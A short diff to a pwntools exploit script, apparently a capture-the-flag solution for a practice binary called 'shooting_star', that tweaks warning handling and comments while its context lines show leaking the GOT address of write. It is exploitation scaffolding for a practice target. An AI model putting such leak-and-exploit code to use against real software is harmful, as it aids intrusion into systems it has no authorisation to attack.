@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # Author: Hack.You 
 from pwn import *
-
+import warnings
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -25,12 +25,11 @@ exe = './shooting_star'
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
 context.log_level = 'debug'
+warnings.filterwarnings('ignore')
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
-
-# libc = ELF("./libc.so.6")
 
 # Start program
 io = start()
@@ -59,3 +58,4 @@ leaked_addr = io.recv()
 got_write = u64(leaked_addr[:6].ljust(8, b"\x00"))
 info("leaked got_write: %#x", got_write)
 
+#io.interactive()
